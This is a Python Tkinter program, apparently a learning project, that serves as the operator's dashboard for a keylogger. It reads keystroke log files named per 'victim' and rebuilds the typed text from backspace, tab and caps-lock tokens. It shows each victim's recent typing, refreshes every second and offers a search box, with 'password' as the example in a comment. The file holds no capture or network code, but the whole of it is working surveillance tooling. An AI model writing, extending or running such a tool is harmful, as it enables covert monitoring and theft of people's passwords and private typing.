import tkinter as tk
from pathlib import Path
import re

LOG_DIR = Path("logs")
TOKEN_PATTERN = re.compile(r"\[(BS|TAB|DEL|SHIFT|CAPS)\]")
REFRESH_SECONDS = 1
TAB_SIZE = 4

def apply_backspace(lines):
    if not lines:
        lines.append("")

    if lines[-1]: # Symbol for last line of text
        lines[-1] = lines[-1][:-1] # Cut off the last char
    elif len(lines) > 1: # If curr line empty, and there are more lines before, remove this/last line
        lines.pop()

def parse_log(raw_text):
    raw_text = raw_text.replace("\\[", "[") # \\ take actual "\" not the escape char
    raw_text = raw_text.replace("\\]", "]")

    lines = [""]
    caps_on = False
    pos = 0

    for match in TOKEN_PATTERN.finditer(raw_text): # Find all the tokens
        start, end = match.span() # returns the exact starting and ending index of the tag inside the string

        normal_text = raw_text[pos:start] # Helk[BS]lo --> Helk
        for ch in normal_text:
            if ch == "\n":
                lines.append("")
            else:
                if caps_on and ch.isalpha(): # Alphabet letter
                    ch = ch.upper()
                lines[-1] += ch

        token = match.group() # Extracts the actual string of the tag ([BS])

        if token == "[BS]":
            apply_backspace(lines)
        elif token == "[TAB]":
            lines[-1] += " " * TAB_SIZE
        elif token == "[DEL]":
            pass
        elif token == "[SHIFT]":
            pass
        elif token == "[CAPS]":
            caps_on = not caps_on

        pos = end # End of the tag

    remaining_text = raw_text[pos:] # Helk[BS]lo --> lo
    for ch in remaining_text:
        if ch == "\n":
            lines.append("")
        else:
            if caps_on and ch.isalpha():
                ch = ch.upper()
            lines[-1] += ch

    return "\n".join(lines) # Finished with this line and we glue it to the next like with \n


def read_all_logs():
    clients = []

    if not LOG_DIR.exists():
        return clients

    for log_file in sorted(LOG_DIR.glob("*.log")): # For every file and checks if the filename ends with .log
                                                   # glob generates an array: ["logs/victim1.log", "logs/victim2.log"]
        raw_text = log_file.read_text()
        parsed_text = parse_log(raw_text)

        clients.append({
            "victim id": log_file.stem, # .stem gets the filename
            "filename": log_file.name,
            "size": log_file.stat().st_size, # Size of the file in bytes
            "parsed_text": parsed_text
        })

    return clients


def update_dashboard():
    clients = read_all_logs()
    
    # Build the string of text to show on screen
    display_text = f"Clients found: {len(clients)}\n\n"
    
    for client in clients:
        display_text += "-" * 70 + "\n"
        display_text += f"Victim ID: {client['victim id']}\n"
        display_text += f"File: {client['filename']} | Size: {client['size']} bytes\n"
        display_text += "-" * 70 + "\n"
        display_text += client["parsed_text"][-800:] + "\n\n"
        
    # Unlock the text box, clean it, insert new text, lock it again
    text_box.config(state=tk.NORMAL)
    text_box.delete("1.0", tk.END)
    text_box.insert(tk.END, display_text)

    # sort of CTRL F
    to_search = search_entry.get() # get the text we wanna search
    if to_search:
        # Search from end to find the most recent
        pos = text_box.search(to_search, tk.END, stopindex="1.0", backwards=True, nocase=True) # tk.END - start at bottom text box, nocase = ignore caps
        if pos:
            # Calc end position of matched word
            end_pos = f"{pos}+{len(to_search)}c" # pos+ = line.column add to start pos: pos = 3.5 "password": "3.5+8c"
            # Highlight tag the word
            text_box.tag_add("highlight", pos, end_pos) 
            # Auto scroll to the word
            text_box.see(pos)

    text_box.config(state=tk.DISABLED) # Read only
    
    # Tkinter - run function again in 1000 milliseconds (1 sec)
    root.after(REFRESH_SECONDS * 1000, update_dashboard)


def main():
    global root, text_box, search_entry # global so that update_dashboard() can access them
    
    # UI
    root = tk.Tk()
    root.title("Keylogger Dashboard")
    root.geometry("800x600")
    root.configure(bg="#1b2a6f")

    # Bind Ctrl+F to focus the search bar
    root.bind('<Control-f>', lambda e: search_entry.focus_set())
    root.bind('<Control-F>', lambda e: search_entry.focus_set())

    # Top Title
    title_label = tk.Label(
        root, 
        text="--------- KEYLOGGER DASHBOARD ---------", 
        bg="#1b2a6f",
        fg="#4ade80",
        font=("Courier", 16, "bold")
    )
    title_label.pack(pady=15)

    # Search Bar Frame
    search_frame = tk.Frame(root, bg="#1b2a6f")
    search_frame.pack(fill=tk.X, padx=20, pady=(0, 10))

    tk.Label(
        search_frame, 
        text="Search (Ctrl+F):", 
        bg="#1b2a6f", 
        fg="#4ade80", 
        font=("Courier", 10, "bold")
    ).pack(side=tk.LEFT)

    search_entry = tk.Entry(
        search_frame, 
        bg="#0d1740", 
        fg="#4ade80", 
        insertbackground="#4ade80", # Cursor color
        bd=2, 
        relief=tk.SUNKEN
    )
    search_entry.pack(side=tk.LEFT, fill=tk.X, expand=True, padx=10)

    # Main Text Area
    text_box = tk.Text(
        root, 
        bg="#0d1740", # background
        fg="#4ade80", # text
        bd=3, # boarder
        relief=tk.SUNKEN, # make the boarder fancy
        highlightthickness=0, # no highlight on text box
        font=("Comfortaa", 11),
        padx=10, 
        pady=10
    )
    # Pack it so it expands to fill the window
    text_box.pack(expand=True, fill=tk.BOTH, padx=20, pady=20)

    update_dashboard()

    # Start the graphics window
    root.mainloop()


if __name__ == "__main__":
    main()